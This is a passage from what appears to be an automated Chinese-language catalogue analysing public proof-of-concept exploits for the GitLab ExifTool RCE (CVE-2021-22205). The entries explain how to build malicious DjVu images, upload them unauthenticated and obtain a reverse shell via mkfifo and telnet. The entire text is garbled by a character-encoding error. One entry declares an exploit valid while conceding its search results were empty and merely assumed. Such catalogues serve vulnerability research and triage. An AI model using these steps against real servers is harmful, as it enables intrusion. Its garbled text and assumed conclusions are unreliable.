2.  **å‘é€Payloadï¼š**  PoC ä½¿ç”¨ `curl` å‘½ä»¤å°†ç”Ÿæˆçš„ lol.jpg æ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°å°†æ–‡ä»¶ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ã€‚`http://10.0.0.7/$(openssl rand -hex 8)` è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»æ„ endpoint è§¦å‘è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
é€šè¿‡åˆ†æžPoCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ã€‚è¯¥ä»£ç æ—¨åœ¨ç”Ÿæˆå¹¶ä¸Šä¼ ä¸€ä¸ªåŒ…å«åå‘ shell çš„å›¾åƒæ–‡ä»¶ã€‚æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´žï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸Žæ¼æ´žåˆ©ç”¨æ— å…³çš„æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…æž„é€ æ¶æ„çš„DjVuå›¾åƒï¼Œè¯¥å›¾åƒåµŒå…¥äº†å‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…é€šè¿‡ä¸Šä¼ åŠŸèƒ½ï¼Œå°†æž„é€ çš„å›¾åƒä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸ä¼šé˜»æ­¢æ¶æ„å›¾åƒã€‚
3.  GitLabåœ¨å¤„ç†å›¾åƒæ—¶ï¼Œè°ƒç”¨ExifToolç­‰å›¾åƒå¤„ç†å·¥å…·ã€‚
4.  ExifToolè§£æžæ¶æ„å›¾åƒï¼Œæ‰§è¡Œå…¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…é€šè¿‡åå‘shellèŽ·å–å¯¹GitLabæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œä»Žè€Œå®žçŽ°å¯¹ç³»ç»Ÿçš„æŽ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-](https://github.com/momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #18

**æ¥æº**: [CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žå­˜åœ¨äºŽGitLabä¸­ï¼Œç”±äºŽExifToolåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶æœªæ­£ç¡®éªŒè¯ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶è§¦å‘æ¼æ´žã€‚å…·ä½“æ¥è¯´ï¼ŒGitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè€ŒExifToolåœ¨å¤„ç†DjVuæ ¼å¼æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´žã€‚æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ä»£ç çš„DjVuæ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³GitLabï¼Œå½“GitLabå°è¯•è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œç»éªŒè¯æœ‰æ•ˆã€‚å®ƒé€šè¿‡åˆ›å»ºåŒ…å«æ¶æ„å…ƒæ•°æ®çš„DjVuå›¾åƒæ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚å½“GitLabå¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡ŒåµŒå…¥åœ¨å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°ä»»ä½•éšè—çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç çš„åŠŸèƒ½æ˜Žç¡®ï¼Œå³åˆ©ç”¨CVE-2021-22205æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚æ‰€æœ‰æ“ä½œéƒ½åœ¨è„šæœ¬ä¸­æ¸…æ™°å¯è§ï¼Œæ²¡æœ‰æ··æ·†æˆ–éšè—è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦èŽ·å–ç›®æ ‡GitLabå®žä¾‹çš„URLã€‚
2.  ç„¶åŽï¼Œæ”»å‡»è€…ä½¿ç”¨POCè„šæœ¬ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„DjVuå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
3.  è„šæœ¬ä½¿ç”¨`djvumake`å‘½ä»¤åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„`rce.djvu`æ–‡ä»¶ï¼Œå†å°†å…¶é‡å‘½åä¸º`rce.jpg`ã€‚
4.  POCä»£ç é€šè¿‡æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚
5.  GitLabæŽ¥æ”¶åˆ°æ–‡ä»¶åŽï¼Œä¼šè°ƒç”¨ExifToolè¿›è¡Œå¤„ç†ï¼Œç”±äºŽExifToolå­˜åœ¨æ¼æ´žï¼Œå¯¼è‡´æ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„ä»£ç ã€‚
6.  æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [mr-r3bot/Gitlab-CVE-2021-22205](https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #19

**æ¥æº**: [CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md](../2021/CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLabä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ExifToolå‘½ä»¤æ³¨å…¥ä»£ç ï¼Œå½“GitLabå°è¯•å¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„POCä»£ç ï¼Œæ­¤æ¼æ´žåˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ï¼Œå¹¶ä¸”CISA KEVç›®å½•ä¹Ÿæ”¶å½•äº†è¯¥æ¼æ´žï¼Œè¯´æ˜Žå­˜åœ¨è¢«åˆ©ç”¨çš„æƒ…å†µã€‚POCä»£ç å®žçŽ°äº†æœªæŽˆæƒæƒ…å†µä¸‹çš„RCEï¼Œåˆ©ç”¨äº†ä¸Šä¼ åŠŸèƒ½å’ŒExifToolçš„å‘½ä»¤æ³¨å…¥ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯å®žçŽ°æ¼æ´žåˆ©ç”¨ï¼Œå¹¶æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚é£Žé™©è¯„ä¼°ä¸º5%ï¼Œè¾ƒä½Žã€‚

*   ä»£ç ç»“æž„æ¸…æ™°ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæž„é€ æ¶æ„å›¾åƒä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚
*   ä»£ç ä¸­å­˜åœ¨ä¸ŽDNSlogäº¤äº’çš„éƒ¨åˆ†ï¼Œå¯ä»¥éªŒè¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚
*   æ€»ä½“è€Œè¨€ï¼Œä»£ç åŠŸèƒ½é›†ä¸­äºŽæ¼æ´žåˆ©ç”¨æœ¬èº«ï¼Œæ²¡æœ‰å‘çŽ°é¢å¤–æ¶æ„è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆæ‰¾åˆ°ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ (`/users/sign_in`)ã€‚
2.  ä»Žç™»å½•é¡µé¢çš„HTMLæºä»£ç ä¸­æå–CSRF tokenï¼Œç”¨äºŽåŽç»­çš„POSTè¯·æ±‚ã€‚
3.  æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ExifToolå‘½ä»¤çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆå®žé™…ä¸Šæ˜¯DJVUæ–‡ä»¶ï¼‰ã€‚è¯¥æ¶æ„å‘½ä»¤è¢«åµŒå…¥åˆ°å›¾åƒçš„metadataä¸­ã€‚
4.  é€šè¿‡å‘ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶çš„multipart/form-data POSTè¯·æ±‚ï¼Œä¸Šä¼ è¯¥å›¾åƒã€‚
5.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifToolæ‰§è¡Œå›¾åƒmetadataä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

åˆ©ç”¨ä»£ç ä¸­åŒ…å«ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

*   æ£€æŸ¥æ¨¡å¼ (`-v true`)ï¼šé€šè¿‡ä¸Šä¼ åŒ…å«ç‰¹å®šDNSlogåŸŸåçš„æ¶æ„å›¾ç‰‡ï¼Œæ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚
*   æ”»å‡»æ¨¡å¼ (`-a true`)ï¼šå…è®¸æ”»å‡»è€…æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ (`-c command`)ï¼Œç›´æŽ¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æ–‡ä»¶æ¨¡å¼ (`-s true`): ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ `-f file`ã€‚

æ€»ç»“ï¼šæ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„å›¾åƒï¼Œåˆ©ç”¨ExifToolå‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå®žçŽ°åœ¨ç›®æ ‡GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [osungjinwoo/CVE-2021-22205-gitlab](https://github.com/osungjinwoo/CVE-2021-22205-gitlab)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #20

**æ¥æº**: [CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md](../2021/CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„å¤šä¸ªç‰ˆæœ¬ã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶è€Œå¯¼è‡´çš„ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨åˆ†æžï¼š**

æä¾›çš„`DejaVu.sh`è„šæœ¬ç”¨äºŽåˆ©ç”¨ CVE-2021-22205ã€‚ä»¥ä¸‹æ˜¯è„šæœ¬çš„å·¥ä½œåŽŸç†ï¼š

1.  **å‚æ•°å¤„ç†ï¼š** è„šæœ¬æŽ¥å— LHOSTï¼ˆæ”»å‡»è€…ç›‘å¬åœ°å€ï¼‰ã€LPORTï¼ˆæ”»å‡»è€…ç›‘å¬ç«¯å£ï¼‰å’Œ WEBHOSTï¼ˆç›®æ ‡ GitLab å®žä¾‹çš„ URLï¼‰ä½œä¸ºå‚æ•°ã€‚
2.  **ç”Ÿæˆæ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `lol.jpg` çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶çš„å‰é¢éƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„JPEGæ–‡ä»¶ï¼ŒåŽé¢é™„åŠ äº†ç²¾å¿ƒæž„é€ çš„ExifToolå‘½ä»¤æ³¨å…¥æœ‰æ•ˆè½½è·ã€‚
3.  **ExifTool å‘½ä»¤æ³¨å…¥ï¼š** æ¼æ´žçš„æ ¹æºåœ¨äºŽ GitLab ä½¿ç”¨ ExifTool å¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶å­˜åœ¨ç¼ºé™·ã€‚é€šè¿‡åœ¨å›¾åƒå…ƒæ•°æ®ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
4.  **åå¼¹ Shellï¼š** è¯¥è„šæœ¬ä½¿ç”¨ `mkfifo` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åŽä½¿ç”¨ `telnet` è¿žæŽ¥åˆ°æ”»å‡»è€…çš„ LHOST å’Œ LPORTï¼Œå¹¶å°† shell çš„è¾“å…¥å’Œè¾“å‡ºé‡å®šå‘åˆ°è¯¥ç®¡é“ã€‚è¿™æœ‰æ•ˆåœ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªåå¼¹ shellã€‚
5.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** è„šæœ¬ä½¿ç”¨ `curl` å‘½ä»¤å°† `lol.jpg` æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°æŒ‡ç¤º `curl` å°†è¯¥æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å‘é€ã€‚æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ï¼Œä»Žè€Œè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† CVE-2021-22205 ä¸­æè¿°çš„æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚é€šè¿‡è®¾ç½®æ­£ç¡®çš„ LHOSTã€LPORT å’Œ WEBHOSTï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ä¸ŠèŽ·å¾— shell è®¿é—®æƒé™ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

åˆ†æžæä¾›çš„è„šæœ¬ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬é€»è¾‘æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨ CVE-2021-22205 æ¼æ´žã€‚æ²¡æœ‰å‘çŽ°ä»»ä½•è¯•å›¾åœ¨å—å®³è€…ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ã€åˆ é™¤æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„éšè—ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š**

1.  æ”»å‡»è€…å‡†å¤‡åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é…ç½® `DejaVu.sh` è„šæœ¬ï¼Œæä¾›æ”»å‡»è€…çš„ç›‘å¬åœ°å€å’Œç«¯å£ä»¥åŠç›®æ ‡ GitLab å®žä¾‹çš„ URLã€‚
3.  æ”»å‡»è€…æ‰§è¡Œè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚
4.  GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè°ƒç”¨ ExifTool æå–å…ƒæ•°æ®ã€‚
5.  ExifTool æ‰§è¡Œæ¶æ„å…ƒæ•°æ®ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹åå¼¹ shellã€‚
6.  æ”»å‡»è€…çŽ°åœ¨å¯ä»¥é€šè¿‡åå¼¹ shell ä¸Ž GitLab æœåŠ¡å™¨äº¤äº’ã€‚

**é¡¹ç›®åœ°å€:** [overgrowncarrot1/DejaVu-CVE-2021-22205](https://github.com/overgrowncarrot1/DejaVu-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #21

**æ¥æº**: [CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md](../2021/CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæŽˆæƒç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯è§¦å‘

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽGitLab CE/EEä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶éªŒè¯ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ã€æœç´¢å¼•æ“Žç»“æžœï¼ˆè™½ç„¶å®žé™…çš„æœç´¢å¼•æ“Žç»“æžœä¸ºç©ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾æœåˆ°çš„æ˜¯ç›¸å…³çš„æ¼æ´žåˆ†æžå’Œå¤çŽ°æ–‡ç« ï¼‰å’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤å®šè¯¥POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯æ˜Žç¡®æŒ‡å‡ºè¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»¥åŠæ¼æ´žæˆå› ï¼ŒPOCä»£ç ä¹Ÿé€šè¿‡æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„DJVUå›¾åƒæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

åˆ†æžæä¾›çš„POCä»£ç ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­åµŒå…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¯¥è„šæœ¬ä»Žå‘½ä»¤è¡ŒæŽ¥æ”¶ç›®æ ‡GitLab URLå’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åŽæž„é€ HTTPè¯·æ±‚ï¼Œä¸Šä¼ åŒ…å«æ¶æ„payloadçš„å›¾åƒæ–‡ä»¶ã€‚è™½ç„¶ä»£ç ä¸­åŒ…å«ä»£ç†è®¾ç½®ï¼ˆ`proxyUrl, err := url.Parse("http://localhost:9090")`ï¼‰ï¼Œé»˜è®¤ä½¿ç”¨`http://localhost:9090`ä½œä¸ºä»£ç†ã€‚å¦‚æžœæ”»å‡»è€…æƒ³è¦è¿›è¡Œä¸­é—´äººæ”»å‡»æˆ–æµé‡åŠ«æŒï¼Œæ¶æ„ä¿®æ”¹ä»£ç†æœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æŠ•æ¯’é£Žé™©ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºæ¶æ„ä»£ç†æœåŠ¡å™¨ï¼Œä½†è¿™ç§é£Žé™©è¾ƒä½Žï¼Œå› ä¸ºè¿™æ›´å¤šçš„æ˜¯ä¸€ç§é…ç½®é—®é¢˜ï¼Œè€Œéžä»£ç æœ¬èº«åŒ…å«æ¶æ„é€»è¾‘ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£Žé™©å¾ˆä½Žï¼Œå¤§çº¦1%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æžï¼š**

1.  æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„payloadçš„DJVUå›¾åƒæ–‡ä»¶ã€‚Payloadä¸­åŒ…å«è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ©ç”¨äº†ExifToolå¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚
2.  æ”»å‡»è€…é€šè¿‡HTTP POSTè¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹çš„`/uploads/user`ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹ç”¨äºŽå¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚
3.  GitLabä½¿ç”¨ExifToolè§£æžä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ã€‚ç”±äºŽæ–‡ä»¶åŒ…å«æ¶æ„payloadï¼ŒExifToolä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹shellã€è¯»å–æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

